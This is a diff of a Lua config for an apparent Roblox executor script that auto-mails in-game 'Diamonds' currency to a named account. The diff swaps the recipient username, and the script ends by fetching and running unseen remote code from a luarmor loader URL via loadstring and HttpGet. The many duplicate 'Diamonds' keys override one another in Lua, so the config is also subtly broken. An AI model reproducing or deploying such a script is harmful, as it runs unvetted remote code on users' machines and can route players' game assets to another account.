@@ -1,11 +1,31 @@
 getgenv().Settings = {
     Mailing = {
-        ["Diamonds"] = {Class = "Currency", Amount = 10000000000}
+        ["Diamonds"] = {Class = "Currency", Amount = "95000000"},
+        ["Diamonds"] = {Class = "Currency", Amount = "90000000"},
+        ["Diamonds"] = {Class = "Currency", Amount = "85000000"},
+        ["Diamonds"] = {Class = "Currency", Amount = "80000000"},
+        ["Diamonds"] = {Class = "Currency", Amount = "75000000"},
+        ["Diamonds"] = {Class = "Currency", Amount = "70000000"},
+        ["Diamonds"] = {Class = "Currency", Amount = "65000000"},
+        ["Diamonds"] = {Class = "Currency", Amount = "60000000"},
+        ["Diamonds"] = {Class = "Currency", Amount = "55000000"},
+        ["Diamonds"] = {Class = "Currency", Amount = "50000000"},
+        ["Diamonds"] = {Class = "Currency", Amount = "45000000"},
+        ["Diamonds"] = {Class = "Currency", Amount = "40000000"},
+        ["Diamonds"] = {Class = "Currency", Amount = "35000000"},
+        ["Diamonds"] = {Class = "Currency", Amount = "30000000"},
+        ["Diamonds"] = {Class = "Currency", Amount = "25000000"},
+        ["Diamonds"] = {Class = "Currency", Amount = "20000000"},
+        ["Diamonds"] = {Class = "Currency", Amount = "15000000"},
+        ["Diamonds"] = {Class = "Currency", Amount = "10000000"},
+        ["Diamonds"] = {Class = "Currency", Amount = "5000000"},
+        ["Diamonds"] = {Class = "Currency", Amount = "3000000"},
+        ["Diamonds"] = {Class = "Currency", Amount = "1000000"},
     },
     Users = {
-        "EmxBanxCa",
+        "anh_phocx",
     },
-    ["Split Items Evenly"] = false, --// False -> it will send the Amount per account.
+    ["Split Items Evenly"] = true, --// False -> it will send the Amount per account.
     ["Only Online Accounts"] = false,
 }
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/86847850c3165379f5be2d9d071eaccb.lua"))()
